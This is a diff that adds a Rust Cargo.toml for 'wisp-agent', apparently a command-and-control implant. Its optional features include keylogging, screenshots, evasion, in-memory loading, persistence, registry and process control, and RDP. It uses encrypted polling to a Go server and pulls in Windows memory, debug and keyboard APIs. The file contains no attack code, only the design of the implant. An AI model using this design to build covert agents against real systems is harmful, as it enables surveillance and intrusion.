@@ -1,0 +1,73 @@
+[package]
+name = "wisp-agent"
+version = "0.1.0"
+edition = "2021"
+
+[lib]
+name = "wisp_agent"
+crate-type = ["cdylib", "rlib"]
+
+[features]
+default = ["screenshot", "keylog", "memload", "evasion", "registry", "persist", "process", "rdp", "rcp"]
+# 插件 feature：未启用 = 该插件不编译进二进制（无该命令）
+screenshot = []
+keylog = []
+loader = []
+rcp = []
+evasion = []
+memload = []
+registry = []
+persist = []
+process = []
+rdp = []
+
+[dependencies]
+# AES-256-CTR + HMAC-SHA256 (must interop with Go crypto/aes, crypto/hmac)
+aes = "0.8"
+ctr = "0.9"
+hmac = "0.12"
+sha2 = "0.10"
+# RSA OAEP SHA-256 (must interop with Go crypto/rsa OAEP SHA256)
+rsa = "0.9"
+# PEM parsing (Go uses PKIX public key + PKCS8/PKCS1 private key)
+pem = "3.0"
+# HTTP client (polling transport)
+ureq = { version = "2.10", features = ["json"] }
+# JSON (task/result/register)
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+# base64 (Go uses StdEncoding)
+image = { version = "0.25", default-features = false, features = ["png", "jpeg"] }
+base64 = "0.22"
+kcp = "0.6"
+# random (session keys, agent id)
+rand = "0.8"
+# hex (agent id)
+hex = "0.4"
+# hostname / user
+hostname = "0.4"
+quinn = { version = "0.11.11", features = ["rustls-ring", "log"] }
+tokio = { version = "1.53.1", features = ["rt-multi-thread", "macros"] }
+rustls = { version = "0.23.43", features = ["ring"] }
+# Windows API (screenshot plugin)
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.59", features = [
+    "Win32_Foundation",
+    "Win32_Graphics_Gdi",
+    "Win32_System_Threading",
+    "Win32_System_ProcessStatus",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Registry",
+    "Win32_System_Memory",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Kernel",
+    "Win32_System_LibraryLoader",
+    "Win32_Security",
+    "Win32_UI_Input_KeyboardAndMouse",
+    "Win32_UI_WindowsAndMessaging",
+] }
+
+[profile.release]
+opt-level = "s"
+strip = true
+lto = true
